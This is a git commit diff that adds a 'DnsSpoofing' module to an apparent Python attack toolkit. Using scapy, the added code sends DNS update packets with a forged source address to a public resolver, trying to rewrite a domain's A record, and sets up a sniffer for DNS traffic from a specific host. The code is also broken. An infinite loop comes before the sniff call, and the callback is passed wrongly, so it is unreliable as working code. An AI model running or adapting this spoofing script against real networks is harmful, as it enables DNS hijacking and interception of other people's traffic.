f4b47faacd6ea318885f1e54c06b3db86489ea94
root <root@localhost.localdomain>
2017-10-20 10:02:30 +0900

    mod

--- DnsSpoofing.py
+++ DnsSpoofing.py
@@ -1,4 +1,5 @@
 from CommandModule import *
+from scapy.all import *
 
 class DnsSpoofing(CommandModule) :
     command = "dns"
@@ -7,4 +8,21 @@ class DnsSpoofing(CommandModule) :
 
     def run(self) :
         print("THIS IS DNS-SPOOFING")
-        pass
+        while True :
+            f()
+        sniff(filter="udp dst port 53 and ip src 192.168.43.6", prn=f())
+
+def f() :
+    r = sr1(
+        IP(src="192.168.43.1", dst="8.8.8.8")
+        /
+        UDP()
+        /
+        DNS(opcode=5,qd=[DNSQR(qname="web1.jtj.kr", qtype="A")],ns=[DNSRR(rrname="web1.jtj.kr", type="A",ttl=0,rdata="")]),
+        verbose=0,timeout=5
+    )
+    print(r)
+
+if __name__ == '__main__' :
+    a = DnsSpoofing()
+    a.run();
